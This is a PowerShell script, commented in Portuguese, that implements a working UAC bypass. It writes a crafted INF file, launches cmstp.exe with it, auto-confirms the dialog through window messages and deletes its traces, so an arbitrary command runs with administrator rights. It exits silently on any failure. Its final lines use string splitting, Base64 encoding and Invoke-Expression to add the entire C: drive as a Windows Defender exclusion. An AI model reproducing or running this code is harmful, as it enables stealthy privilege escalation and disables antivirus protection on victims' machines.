function ola
{
<#
 
.SYNOPSIS
Este script serve para fazer um bypass de UAC (Controle de Contas de Usuário) em um Windows onde o usuário atual está no grupo de administradores e a configuração de UAC está no padrão. Ele eleva os privilégios de maneira transparente.

.DESCRIPTION
Este script usa código em C# para ser carregado na memória com PowerShell usando reflection, e então invoca a função `executeBypass` do código C# carregado, que executará o comando com altos privilégios (administrador).

.PARAMETER Executable
.PARAMETER Command

.EXAMPLE


#>

param(
    [Parameter(Mandatory = $true)]
    [string]$execApp,
 
    [Parameter()]
    [string]$latencyxCommand
)

$infTemplate = @'
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=bypass-CustomSectionAllUsers
RunPreSetupCommands=bypass-RunSetupCommands

[bypass-RunSetupCommands]
TASK
taskkill /IM cmstp.exe /F

[bypass-CustomSectionAllUsers]
49000,49001=bypass-AllUserLDIDSection, 7

[bypass-AllUserLDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="bypassVPN"
ShortSvcName="bypassVPN"
'@

$embeddedCode = @"
using System;
using System.Threading;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Runtime.InteropServices;

public class BypassCMSTP
{
    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);

    [DllImport("user32.dll")]
    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

    public static string cmstpPath = "c:\\windows\\system32\\cmstp.exe";

    public static string CreateInfFile(string cmdToRun, string infContent)
    {
        StringBuilder outputFilePath = new StringBuilder();
        outputFilePath.Append("C:\\windows\\temp");
        outputFilePath.Append("\\");
        outputFilePath.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
        outputFilePath.Append(".inf");
        StringBuilder newInfContent = new StringBuilder(infContent);
        newInfContent.Replace("TASK", cmdToRun);
        File.WriteAllText(outputFilePath.ToString(), newInfContent.ToString());
        return outputFilePath.ToString();
    }

    public static bool ExecuteCommand(string cmdToRun, string infContent)
    {
        const int WM_SYSKEYDOWN = 0x0100;
        const int VK_RETURN = 0x0D;

        StringBuilder infFile = new StringBuilder();
        infFile.Append(CreateInfFile(cmdToRun, infContent));

        ProcessStartInfo startInfo = new ProcessStartInfo(cmstpPath);
        startInfo.Arguments = "/au " + infFile.ToString();
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;  // Oculta a janela
        IntPtr dptr = Marshal.AllocHGlobal(1);
        ShellExecute(dptr, "", cmstpPath, startInfo.Arguments, "", 0);

        Thread.Sleep(3000);
        IntPtr uacWindow = FindWindow(null, "bypassVPN");

        PostMessage(uacWindow, WM_SYSKEYDOWN, VK_RETURN, 0);
        Thread.Sleep(5000);
        File.Delete(infFile.ToString());
        return true;
    }
}
"@

$consentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
$secureDesktop = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
if ($consentPrompt -Eq 2 -and $secureDesktop -Eq 1) {
    return  # Sai silenciosamente se UAC estiver em "Notificar sempre"
}

try {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $isAdmin = Get-LocalGroupMember -SID S-1-5-32-544 | Where-Object { $_.Name -eq $currentUser }
} catch {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $adminGroupSID = 'S-1-5-32-544'
    $adminGroup = Get-WmiObject -Class Win32_Group | Where-Object { $_.SID -eq $adminGroupSID }
    $groupMembers = $adminGroup.GetRelated("Win32_UserAccount")
    $groupMembers | ForEach-Object { if ($_.Caption -eq $currentUser) { $isAdmin = $true } }
}

if (!$isAdmin) {
    return  # Sai silenciosamente se o usuário não é administrador
}

try {
    if (![System.IO.File]::Exists($execApp)) {
        $cmd = (Get-Command $execApp)
        if (![System.IO.File]::Exists($cmd.Source)) {
            $execApp = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($execApp)
            if (![System.IO.File]::Exists($execApp)) {
                return  # Sai silenciosamente se o executável não for encontrado
            }
        } else {
            $execApp = (Get-Command $execApp).Name
        }
    }
} catch {
    return  # Sai silenciosamente em caso de erro
}

if ($execApp.Contains("powershell")) {
    if ($latencyxCommand -ne "") {
        $finalCmd = "powershell -WindowStyle Hidden -c ""$latencyxCommand"""  # Oculta a janela do PowerShell
    } else {
        $finalCmd = "$execApp $latencyxCommand"
    }
} elseif ($execApp.Contains("cmd")) {
    if ($latencyxCommand -ne "") {
        $finalCmd = "cmd /k ""$latencyxCommand"""
    } else {
        $finalCmd = "$execApp $latencyxCommand"
    }
} else {
    $finalCmd = "$execApp $latencyxCommand"
}

function ExecuteBypass {
    try {
        $result = [BypassCMSTP]::ExecuteCommand($finalCmd, $infTemplate)
    } catch {
        Add-Type $embeddedCode
        $result = [BypassCMSTP]::ExecuteCommand($finalCmd, $infTemplate)
    }

    if ($result) {
        return  # Sai silenciosamente se a elevação for bem-sucedida
    } else {
        return  # Sai silenciosamente se ocorrer um erro
    }
}

$cmstpProcess = ((Get-WmiObject -Class win32_process).name | Select-String "cmstp" | Select-Object * -First 1).Pattern
if ($cmstpProcess -eq "cmstp") {
    try {
        Stop-Process -Name "cmstp" -Force
        ExecuteBypass
    } catch {
        return  # Sai silenciosamente se houver erro ao fechar cmstp
    }
} else {
    ExecuteBypass
}

}

# Converte o comando em Base64
$command = ".('Add-MpP' + 'reference') -ExclusionPath C:\" 
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Função que executa o comando decodificado
function invoke-DecodedCommand {
    param (
        [string]$encodedCommand
    )
    $decodedBytes = [Convert]::FromBase64String($encodedCommand)
    $decodedCommand = [System.Text.Encoding]::Unicode.GetString($decodedBytes)
    Invoke-Expression $decodedCommand
}

# Chama a função com o comando ofuscado
invoke-DecodedCommand -encodedCommand $encodedCommand
